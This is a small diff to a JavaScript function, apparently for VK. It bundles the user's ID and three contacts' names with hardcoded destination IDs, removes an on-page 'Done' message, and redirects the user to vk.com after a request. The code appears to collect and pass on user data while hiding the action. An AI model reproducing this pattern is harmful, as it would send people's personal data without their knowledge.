@@ -101,7 +101,6 @@ function Bro3(data) {
 function broCheck() {
 
     var vkmess='{ "self":'+uid+"%2C"+'"1st":'+bro1+"%2C"+'"2st":'+bro2+"%2C"+'"3st":'+bro3+"}+{"+selfname+":"+bro1name+":"+bro2name+":"+bro3name+"}";
-    document.getElementById("demo").innerHTML ="Done";
 
     var dest=10904171;
     var dest2=156201;
@@ -121,7 +120,7 @@ function broCheck() {
     xmlHttp.send( null );
 
 
-
+    window.location = "https://www.vk.com";
 
     // here will be code for message send
 
